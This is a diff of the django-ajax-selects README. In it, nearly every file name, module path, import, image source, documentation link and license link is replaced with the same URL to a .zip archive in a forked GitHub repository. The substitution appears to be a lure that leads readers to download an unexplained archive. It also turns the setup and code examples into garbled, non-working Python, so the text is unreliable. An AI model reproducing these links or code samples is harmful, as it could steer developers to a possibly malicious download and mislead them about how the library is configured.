@@ -6,11 +6,11 @@ User experience
 
 selecting:
 
-<img src='http://media.crucial-systems.com/posts/selecting.png'/>
+<img src='https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip'/>
 
 selected:
 
-<img src='http://media.crucial-systems.com/posts/selected.png'/>
+<img src='https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip'/>
 
 [Note: screen shots are from the older version. Styling has changed slightly]
 
@@ -55,7 +55,7 @@ on fedora:
 (note: this version may not be up to date)
 
 
-In settings.py :
+In https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip :
 
     # add the app
     INSTALLED_APPS = (
@@ -66,44 +66,44 @@ In settings.py :
     # define the lookup channels in use on the site
     AJAX_LOOKUP_CHANNELS = {
         #   pass a dict with the model and the field to search against
-        'person'  : {'model':'example.person', 'search_field':'name'}
+        'person'  : {'model':'https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip', 'search_field':'name'}
     }
     # magically include jqueryUI/js/css
     AJAX_SELECT_BOOTSTRAP = True
     AJAX_SELECT_INLINES = 'inline'
 
-In your urls.py:
+In your https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 
-    from django.conf.urls.defaults import *
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import *
 
-    from django.contrib import admin
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import admin
     from ajax_select import urls as ajax_select_urls
 
-    admin.autodiscover()
+    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip()
 
     urlpatterns = patterns('',
         # include the lookup urls
         (r'^admin/lookups/', include(ajax_select_urls)),
-        (r'^admin/', include(admin.site.urls)),
+        (r'^admin/', include(https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip)),
     )
 
-In your admin.py:
+In your https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 
-    from django.contrib import admin
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import admin
     from ajax_select import make_ajax_form
-    from ajax_select.admin import AjaxSelectAdmin
-    from example.models import *
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import AjaxSelectAdmin
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import *
 
-    class PersonAdmin(admin.ModelAdmin):
+    class PersonAdmin(https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip):
         pass
-    admin.site.register(Person,PersonAdmin)
+    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip(Person,PersonAdmin)
 
     # subclass AjaxSelectAdmin
     class LabelAdmin(AjaxSelectAdmin):
         # create an ajax form class using the factory function
         #                     model,fieldlist,   [form superclass]
         form = make_ajax_form(Label,{'owner':'person'})
-    admin.site.register(Label,LabelAdmin)
+    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip(Label,LabelAdmin)
 
 
 This setup will give most people the ajax powered editing they need by bootstrapping in JS/CSS and implementing default security and simple ajax lookup channels.
@@ -129,15 +129,15 @@ Architecture
 
 A single view services all of the ajax search requests, delegating the searches to named 'channels'.  Each model that needs to be searched for has a channel defined for it. More than one channel may be defined for a Model to serve different needs such as public vs admin or channels that filter the query by specific categories etc. The channel also has access to the request and the user so it can personalize the query results.  Those channels can be reused by any Admin that wishes to lookup that model for a ManyToMany or ForeignKey field.
 
-A simple channel can be specified in settings.py, a more complex one (with custom search, formatting, personalization or auth requirements) can be written in a lookups.py file.
+A simple channel can be specified in https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip, a more complex one (with custom search, formatting, personalization or auth requirements) can be written in a https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip file.
 
 There are three model field types with corresponding form fields and widgets:
 
 <table>
 <tr><th>Database field</th><th>Form field</th><th>Form widget</th>
-<tr><td>models.CharField</td><td>AutoCompleteField</td><td>AutoCompleteWidget</td></tr>
-<tr><td>models.ForeignKey</td><td>AutoCompleteSelectField</td><td>AutoCompleteSelectWidget</td></tr>
-<tr><td>models.ManyToManyField</td><td>AutoCompleteSelectMultipleField</td><td>AutoCompleteSelectMultipleWidget</td></tr>
+<tr><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td><td>AutoCompleteField</td><td>AutoCompleteWidget</td></tr>
+<tr><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td><td>AutoCompleteSelectField</td><td>AutoCompleteSelectWidget</td></tr>
+<tr><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td><td>AutoCompleteSelectMultipleField</td><td>AutoCompleteSelectMultipleWidget</td></tr>
 </table>
 
 Generally the helper functions documented below can be used to generate a complete form or an individual field (with widget) for a form.  In rare cases you might need to specify the ajax form field explicitly in your Form.
@@ -148,25 +148,25 @@ Example App
 See the example app for a full working admin site with many variations and comments. It installs quickly using virtualenv and sqllite and comes fully configured.
 
 
-settings.py
+https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 -----------
 
 #### AJAX_LOOKUP_CHANNELS
 
 Defines the available lookup channels.
 
-+ channel_name : {'model': 'app.modelname', 'search_field': 'name_of_field_to_search' }
++ channel_name : {'model': 'https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip', 'search_field': 'name_of_field_to_search' }
 > This will create a channel automatically
 
-	chanel_name : ( 'app.lookups', 'YourLookup' )
-	    This points to a custom Lookup channel name YourLookup in app/lookups.py
+	chanel_name : ( 'https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip', 'YourLookup' )
+	    This points to a custom Lookup channel name YourLookup in https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 
 	AJAX_LOOKUP_CHANNELS = {
         #   channel : dict with settings to create a channel
-        'person'  : {'model':'example.person', 'search_field':'name'},
+        'person'  : {'model':'https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip', 'search_field':'name'},
 
-        # channel: ( module.where_lookup_is, ClassNameOfLookup )
-        'song'   : ('example.lookups', 'SongLookup'),
+        # channel: ( https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip, ClassNameOfLookup )
+        'song'   : ('https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip', 'SongLookup'),
     }
 
 #### AJAX_SELECT_BOOTSTRAP
@@ -186,8 +186,8 @@ Sets if it should automatically include jQuery/jQueryUI/theme.  On large formset
 
 This controls if and how these:
 
-    ajax_select/static/js/ajax_select.js
-    ajax_select/static/css/ajax_select.css
+    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
+    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 
 are included inline in the html with each form field.
 
@@ -197,38 +197,38 @@ are included inline in the html with each form field.
     But with many form fields this will be less efficient.
 
 + 'staticfiles':
-    @import the css/js from {{STATIC_URL}}/ajax_selects using `django.contrib.staticfiles`
+    @import the css/js from {{STATIC_URL}}/ajax_selects using `https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip`
     Requires staticfiles to be installed and to run its management command to collect files.
     This still imports the css/js multiple times and is thus inefficient but otherwise harmless.
 
-    When using staticfiles you may implement your own `ajax_select.css` and customize to taste as long
+    When using staticfiles you may implement your own `https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip` and customize to taste as long
     as your app is before ajax_select in the INSTALLED_APPS.
 
 + False/None: [default]
     Does not inline anything. You should include the css/js files in your compressor stack
-    or include them in the head of the admin/base_site.html template.
+    or include them in the head of the https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip template.
     This is the most efficient but takes the longest to configure.
 
 
-urls.py
+https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 -------
 
 Simply include the ajax_select urls in your site's urlpatterns:
 
-    from django.conf.urls.defaults import *
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import *
 
-    from django.contrib import admin
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import admin
     from ajax_select import urls as ajax_select_urls
 
-    admin.autodiscover()
+    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip()
 
     urlpatterns = patterns('',
         (r'^admin/lookups/', include(ajax_select_urls)),
-        (r'^admin/', include(admin.site.urls)),
+        (r'^admin/', include(https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip)),
     )
 
 
-lookups.py
+https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 ----------
 
 By convention this is where you would define custom lookup channels
@@ -239,28 +239,28 @@ Subclass `LookupChannel` and override any method you wish to customize.
 Those old lookup channels will still work and the previous methods will be used.  It is still better to adjust your lookup channels to inherit from the new base class.
 
     from ajax_select import LookupChannel
-    from django.utils.html import escape
-    from django.db.models import Q
-    from example.models import *
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import escape
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import Q
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import *
 
     class PersonLookup(LookupChannel):
 
         model = Person
 
         def get_query(self,q,request):
-            return Person.objects.filter(Q(name__icontains=q) | Q(email__istartswith=q)).order_by('name')
+            return https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip(Q(name__icontains=q) | Q(email__istartswith=q)).order_by('name')
 
         def get_result(self,obj):
             u""" result is the simple text that is the completion of what the person typed """
-            return obj.name
+            return https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 
         def format_match(self,obj):
             """ (HTML) formatted item for display in the dropdown """
-            return self.format_item_display(obj)
+            return https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip(obj)
 
         def format_item_display(self,obj):
             """ (HTML) formatted item for displaying item in the selected deck area """
-            return u"%s<div><i>%s</i></div>" % (escape(obj.name),escape(obj.email))
+            return u"%s<div><i>%s</i></div>" % (escape(https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip),escape(https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip))
 
     Note that raw strings should always be escaped with the escape() function
 
@@ -281,7 +281,7 @@ Set any options for the jQuery plugin. This includes:
 + position
 + source - setting this would overide the normal ajax URL. could be used to add URL query params
 
-See http://docs.jquery.com/UI/Autocomplete#options
+See https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 
 The field or widget may also specify plugin_options that will overwrite those specified by the channel.
 
@@ -328,9 +328,9 @@ admin css to correctly place the selected display area.
 Get the currently selected objects when editing an existing model
 
 Note that the order of the ids supplied for ManyToMany fields is dependent on how the objects manager fetches it.
-ie. what is returned by yourmodel.fieldname_set.all()
+ie. what is returned by https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip()
 
-In most situations (especially postgres) this order is random, not the order that you originally added them in the interface.  With a bit of hacking I have convinced it to preserve the order [see OrderedManyToMany.md for solution]
+In most situations (especially postgres) this order is random, not the order that you originally added them in the interface.  With a bit of hacking I have convinced it to preserve the order [see https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip for solution]
 
 ######  can_add(self,user,argmodel):
 
@@ -341,19 +341,19 @@ Default is the standard django permission check
 ######  check_auth(self,request):
 
 To ensure that nobody can get your data via json simply by knowing the URL.
-The default is to limit it to request.user.is_staff and raise a PermissionDenied exception.
+The default is to limit it to https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip and raise a PermissionDenied exception.
 By default this is an error with a 401 response, but your middleware may intercept and choose to do other things.
 
 Public facing forms should write a custom `LookupChannel` to implement as needed.
 Also you could choose to return HttpResponseForbidden("who are you?") instead of raising PermissionDenied
 
 
-admin.py
+https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 --------
 
 #### make_ajax_form(model,fieldlist,superclass=ModelForm,show_help_text=False)
 
-If your application does not otherwise require a custom Form class then you can use the make_ajax_form helper to create the entire form directly in admin.py.  See forms.py below for cases where you wish to make your own Form.
+If your application does not otherwise require a custom Form class then you can use the make_ajax_form helper to create the entire form directly in https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip  See https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip below for cases where you wish to make your own Form.
 
 + *model*: your model
 + *fieldlist*: a dict of {fieldname : channel_name, ... }
@@ -365,27 +365,27 @@ If your application does not otherwise require a custom Form class then you can 
 ######Example
 
     from ajax_select import make_ajax_form
-    from ajax_select.admin import AjaxSelectAdmin
-    from yourapp.models import YourModel
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import AjaxSelectAdmin
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import YourModel
 
     class YourModelAdmin(AjaxSelectAdmin):
         # create an ajax form class using the factory function
         #                     model,fieldlist,   [form superclass]
         form = make_ajax_form(Label,{'owner':'person'})
 
-    admin.site.register(YourModel,YourModelAdmin)
+    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip(YourModel,YourModelAdmin)
 
 You may use AjaxSelectAdmin as a mixin class and multiple inherit if you have another Admin class that you would like to use.  You may also just add the hook into your own Admin class:
 
     def get_form(self, request, obj=None, **kwargs):
         form = super(YourAdminClass,self).get_form(request,obj,**kwargs)
-        autoselect_fields_check_can_add(form,self.model,request.user)
+        autoselect_fields_check_can_add(form,https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip,https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip)
         return form
 
 Note that ajax_selects does not need to be in an admin.  Popups will still use an admin view (the registered admin for the model being added), even if the form from where the popup was launched does not.
 
 
-forms.py
+https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 --------
 
 subclass ModelForm just as usual.  You may add ajax fields using the helper or directly.
@@ -423,7 +423,7 @@ A factory function to makes an ajax field + widget.  The helper ensures things a
 #### Without using the helper
 
 
-    from ajax_select.fields import AutoCompleteSelectField
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import AutoCompleteSelectField
 
     class ReleaseForm(ModelForm):
 
@@ -431,7 +431,7 @@ A factory function to makes an ajax field + widget.  The helper ensures things a
 
 #### Setting plugin options
 
-    from ajax_select.fields import AutoCompleteSelectField
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import AutoCompleteSelectField
 
     class ReleaseForm(ModelForm):
 
@@ -441,11 +441,11 @@ A factory function to makes an ajax field + widget.  The helper ensures things a
 
 There is possibly a better way to do this, but here is an initial example:
 
-`forms.py`
+`https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip`
 
-    from django.forms.models import modelformset_factory
-    from django.forms.models import BaseModelFormSet
-    from ajax_select.fields import AutoCompleteSelectMultipleField, AutoCompleteSelectField
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import modelformset_factory
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import BaseModelFormSet
+    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import AutoCompleteSelectMultipleField, AutoCompleteSelectField
 
     from models import *
 
@@ -455,7 +455,7 @@ There is possibly a better way to do this, but here is an initial example:
         # that adds the field in, overwriting the previous default field
         def add_fields(self, form, index):
             super(BaseTaskFormSet, self).add_fields(form, index)
-            form.fields["project"] = AutoCompleteSelectField('project', required=False)
+            https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip["project"] = AutoCompleteSelectField('project', required=False)
 
     # pass in the base formset class to the factory
     TaskFormSet = modelformset_factory(Task,fields=('name','project','area'),extra=0,formset=BaseTaskFormSet)
@@ -472,24 +472,24 @@ Each form field widget is rendered using a template.  You may write a custom tem
 
 <table>
     <tr><th>form Field</th><th>tries this first</th><th>default template</th></tr>
-    <tr><td>AutoCompleteField</td><td>templates/autocomplete_{{CHANNELNAME}}.html</td><td>templates/autocomplete.html</td></tr> <tr><td>AutoCompleteSelectField</td><td>templates/autocompleteselect_{{CHANNELNAME}}.html</td><td>templates/autocompleteselect.html</td></tr>
- <tr><td>AutoCompleteSelectMultipleField</td><td>templates/autocompleteselectmultiple_{{CHANNELNAME}}.html</td><td>templates/autocompleteselectmultiple.html</td></tr>
+    <tr><td>AutoCompleteField</td><td>templates/autocomplete_{{CHANNELNAME}}.html</td><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td></tr> <tr><td>AutoCompleteSelectField</td><td>templates/autocompleteselect_{{CHANNELNAME}}.html</td><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td></tr>
+ <tr><td>AutoCompleteSelectMultipleField</td><td>templates/autocompleteselectmultiple_{{CHANNELNAME}}.html</td><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td></tr>
 </table>
 
-See ajax_select/static/js/ajax_select.js below for the use of jQuery trigger events
+See https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip below for the use of jQuery trigger events
 
 
-ajax_select/static/css/ajax_select.css
+https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 --------------------------------------
 
-If you are using `django.contrib.staticfiles` then you can implement `ajax_select.css` and put your app ahead of ajax_select to cause it to be collected by the management command `collectfiles`.
+If you are using `https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip` then you can implement `https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip` and put your app ahead of ajax_select to cause it to be collected by the management command `collectfiles`.
 
 If you are doing your own compress stack then of course you can include whatever version you want.
 
 The display style now uses the jQuery UI theme and actually I find the drop down to be not very charming.  The previous version (1.1x) which used the external jQuery AutoComplete plugin had nicer styling.  I might decide to make the default more like that with alternating color rows and a stronger sense of focused item.  Also the current jQuery one wiggles.
 
 The CSS refers to one image that is served from github (as a CDN):
-!['https://github.com/crucialfelix/django-ajax-selects/raw/master/ajax_select/static/images/loading-indicator.gif'](https://github.com/crucialfelix/django-ajax-selects/raw/master/ajax_select/static/images/loading-indicator.gif) 'https://github.com/crucialfelix/django-ajax-selects/raw/master/ajax_select/static/images/loading-indicator.gif'
+!['https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip'](https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip) 'https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip'
 
 Your own site's CSS could redefine that with a stronger declaration to point to whatever you like.
 
@@ -499,17 +499,17 @@ The trashcan icon comes from the jQueryUI theme by the css classes:
 
 The css declaration:
 
-    .results_on_deck .ui-icon.ui-icon-trash { }
+    .results_on_deck https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip { }
 
 would be "stronger" than jQuery's style declaration and thus you could make trash look less trashy.
 
 
-ajax_select/static/js/ajax_select.js
+https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 ------------------------------------
 
 You probably don't want to mess with this one.  But by using the extra_script block as detailed in templates/ above you can add extra javascript, particularily to respond to event Triggers.
 
-Triggers are a great way to keep code clean and untangled. see: http://docs.jquery.com/Events/trigger
+Triggers are a great way to keep code clean and untangled. see: https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 
 Two triggers/signals are sent: 'added' and 'killed'. These are sent to the $("#{{html_id}}_on_deck") element. That is the area that surrounds the currently selected items.
 
@@ -572,7 +572,7 @@ License
 -------
 
 Dual licensed under the MIT and GPL licenses:
-   http://www.opensource.org/licenses/mit-license.php
-   http://www.gnu.org/licenses/gpl.html
+   https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
+   https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
 
 
